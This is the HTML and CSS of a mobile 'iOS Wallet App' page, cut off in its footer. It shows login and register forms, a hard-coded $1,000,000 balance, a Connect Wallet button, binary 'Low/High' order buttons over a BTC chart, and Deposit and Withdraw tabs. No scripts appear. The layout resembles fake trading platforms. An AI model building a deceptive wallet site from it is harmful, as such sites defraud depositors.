<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>iOS Wallet App</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    body {
      margin: 0;
      background: #0d1117;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    .container, .login-container {
      background: #161b22;
      border-radius: 12px;
      padding: 25px 20px;
      width: 92%;
      max-width: 500px;
      margin: 20px auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
    }
    .login-input {
      width: 100%;
      padding: 14px;
      margin-bottom: 16px;
      border-radius: 8px;
      border: 1px solid #333;
      background: #1e2328;
      color: #fff;
    }
    .login-button {
      width: 100%;
      padding: 14px;
      background: #1f6feb;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 17px;
    }
    .hidden { display: none; }

    .footer {
      position: fixed;
      bottom: 0;
      width: 100%;
      background: #161b22;
      display: flex;
      justify-content: space-around;
      border-top: 1px solid #30363d;
      z-index: 10;
      padding: 10px 0;
    }
    .footer-btn {
      text-align: center;
      color: #aaa;
      font-size: 13px;
      flex: 1;
    }
    .footer-btn i {
      font-size: 20px;
      display: block;
      margin-bottom: 4px;
    }

    .modal {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.85);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }

    .modal-content {
      background: #161b22;
      padding: 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
    }

    .balance {
      font-size: 22px;
      color: #39ff14;
      margin-top: 10px;
    }

    .wallet-info {
      font-size: 12px;
      word-break: break-word;
      margin-top: 10px;
    }

    .chart-container {
      position: relative;
      margin-top: 20px;
    }

    .chart-buttons {
      display: flex;
      justify-content: center;
      margin-bottom: 10px;
    }

    .chart-buttons button {
      padding: 10px 20px;
      margin: 0 10px;
      border: none;
      border-radius: 5px;
      color: #fff;
      cursor: pointer;
    }

    .btn-low { background-color: #ff4d4d; } /* Red */
    .btn-high { background-color: #4caf50; } /* Green */

    iframe {
      border-radius: 10px;
      width: 100%;
      height: 400px;
    }
  </style>
</head>
<body>

<div class="login-container" id="loginForm">
  <h2>Login</h2>
  <input type="email" id="loginEmail" class="login-input" placeholder="Email" />
  <input type="password" id="loginPassword" class="login-input" placeholder="Password" />
  <button class="login-button" onclick="login()">Login</button>
  <p style="color:red;" id="loginError"></p>
  <p style="text-align:center; font-size:14px;" onclick="toggleForm('register')">Don't have an account? Register</p>
</div>

<div class="login-container hidden" id="registerForm">
  <h2>Register</h2>
  <input type="email" id="registerEmail" class="login-input" placeholder="Email" />
  <input type="password" id="registerPassword" class="login-input" placeholder="Password" />
  <button class="login-button" onclick="register()">Register</button>
  <p style="color:red;" id="registerError"></p>
  <p style="text-align:center; font-size:14px;" onclick="toggleForm('login')">Already have an account? Login</p>
</div>

<div class="container hidden" id="dashboard">
  <h2>Wallet Dashboard</h2>
  <div class="wallet-info" id="walletAddress">Not connected</div>
  <div class="balance">Balance: $1,000,000.00</div>
  <button class="login-button" onclick="connectWallet()">Connect Wallet</button>

  <div class="chart-container">
    <div class="chart-buttons">
      <button class="btn-low" onclick="processOrder('Low')">Low</button>
      <button class="btn-high" onclick="processOrder('High')">High</button>
    </div>
    <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
  </div>
</div>

<div class="footer hidden" id="footerNav">
  <div class="footer-btn" onclick="openModal('depositModal')">
    <i class="fas fa-arrow-down"></i>Deposit
  </div>
  <div class="footer-btn" onclick="openModal('withdrawModal')">
    <i class="fas fa-arrow-up"></i>Withdraw
  </div>
  <div class="footer-btn" onclick="alert('Transactions Coming Soon')">
    <i class="fas fa-list-alt"></i>Transactions
  </div>
  <div class="footer-btn" onclick="openModal('settingsModal')">
